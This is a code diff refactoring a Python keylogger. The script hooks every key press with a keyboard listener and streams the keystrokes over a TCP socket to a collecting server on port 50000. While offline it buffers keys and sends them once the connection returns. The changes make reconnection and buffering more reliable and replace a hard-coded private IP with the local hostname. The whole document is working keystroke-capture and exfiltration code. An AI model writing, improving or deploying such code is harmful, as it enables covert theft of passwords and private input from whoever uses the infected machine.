@@ -14,15 +14,18 @@ class Socket:
     connection = False
 
     def __init__(self):
+        self.active_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.active_socket.settimeout(1)
+        self.connect_to_server()
+
+    def connect_to_server(self):
         try:
-            self.active_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            self.active_socket.settimeout(1)
-            self.active_socket.connect(("192.168.178.26", 50000))
+            self.active_socket.connect((socket.gethostname(), 50000))
             Socket.connection = True
             print("Connection established")
         except (ConnectionRefusedError, TimeoutError, socket.error):
+            Socket.connection = False
             print("No connection established!")
-            pass
 
     def send_char(self, char):
         char = dumps(char)
@@ -45,18 +48,10 @@ class Socket:
             except(ConnectionResetError, ConnectionAbortedError, OSError):
                 Socket.connection = False
 
-    def reconnect(self):
-        self.active_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        try:
-            self.active_socket.connect((socket.gethostname(), 50000))
-            Socket.connection = True
-        except socket.error:
-            pass
-
 
 def no_safe_key_press(key):
     key = str(key).replace("'", "")
-    send = active.send_char(key)
+    send = connection_established.send_char(key)
     if not send:
         Global.key_array.append(key)
         Socket.connection = False
@@ -67,21 +62,22 @@ def safe_key_press(key):
     key = str(key).replace("'", "")
     Global.key_array.append(key)
     Global.i += 1
-    if Global.i == 200:
+    if Global.i == 20:
         Global.i = 0
         return False
 
 
+connection_established = Socket()
 while True:
     if not Socket.connection:
-        active = Socket()
+        connection_established.connect_to_server()
 
     if Socket.connection and not Global.key_array:
         with Listener(on_press=no_safe_key_press)as f:
             f.join()
 
     elif Socket.connection and Global.key_array:
-        active.send_array(Global.key_array)
+        connection_established.send_array(Global.key_array)
 
     elif not Socket.connection:
         with Listener(on_press=safe_key_press)as f:
